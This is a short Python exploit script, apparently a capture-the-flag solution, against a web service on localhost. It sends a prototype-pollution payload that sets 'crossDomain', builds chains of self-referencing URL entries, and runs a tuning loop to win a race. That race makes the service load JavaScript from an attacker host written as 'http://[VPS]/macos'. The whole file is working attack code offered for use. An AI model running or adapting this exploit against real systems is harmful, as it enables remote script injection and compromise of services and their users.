#!/usr/bin/env python3
import requests, time

url = "http://localhost:8888"
urlApi = url + "/data"
urlEvilJs = "http://[VPS]/macos"
urlLoopback = "http://localhost:8888"

data0 = {
    "\".constructor.prototype[\"crossDomain": "deadbeef "
}
data1 = {
    "block": urlEvilJs
}
data2 = {
    "type": "url",
    "block": urlLoopback
}

def addChain(num):
    res = requests.post(urlApi, data={"type": "text", "block": "hello"})
    print(res.text)
    uuid = res.json()['data']['id']
    for i in range(num):
        res = requests.post(urlApi, data={"type": "url", "block": urlLoopback + "/data/" + uuid})
        uuid = res.json()['data']['id']
    return uuid

def pollution():
    requests.post(urlApi, data=data0)
    print('[*] prototype pollution')

def train(x, y):
    xx = x
    yy = y
    epochs = 0
    while True:
        print("[*] epochs {}".format(epochs))
        uuid = addChain(xx)
        requests.delete(urlApi + '/' + uuid)
        res = requests.post(urlApi, data = data1)
        uuid = res.json()['data']['id']
        for i in range(yy):
            requests.post(urlApi, data = data2)
        res = requests.get(url)
        tlen = len(res.json()['data']['types'])
        dlen = len(res.json()['data']['datas'])
        print(res.json())
        print("[*] tlen={}, dlen={}".format(tlen, dlen))
        if tlen == dlen:
            xx += 1
        elif ( dlen - tlen ) > 4:
            yy += 1
        elif ( dlen - tlen ) <= 3:
            break
        elif tlen > dlen:
            # never happen
            pass
        print("[*] x={}, y={}".format(xx, yy))
        epochs += 1
        time.sleep(y+2)
    print("[*] got it! x={}, y={}".format(xx,yy))
    return xx,yy

def exploitChain(uuid, y):
    requests.delete(urlApi + "/" + uuid)
    res = requests.post(urlApi, data = data1)
    uuid = res.json()['data']['id']
    print('[*] uuid: ' + uuid)
    for i in range(y):
        requests.post(urlApi, data = data2)
    res = requests.get(urlApi + "/" + uuid)
    return res.json()

def exploit(x,y):
    times = 0

    pollution()
    while True:
        print("[*] try {} time".format(times + 1))
        uuid = addChain(x)
        res = exploitChain(uuid, y)
        if res['success'] and not 'data' in res.keys():
            print("[*] evil dragon!")
            break
        times += 1
        time.sleep(y+2)

if __name__ == "__main__":
    # y >= 3
    x,y = train(200, 3)
    exploit(x,y)
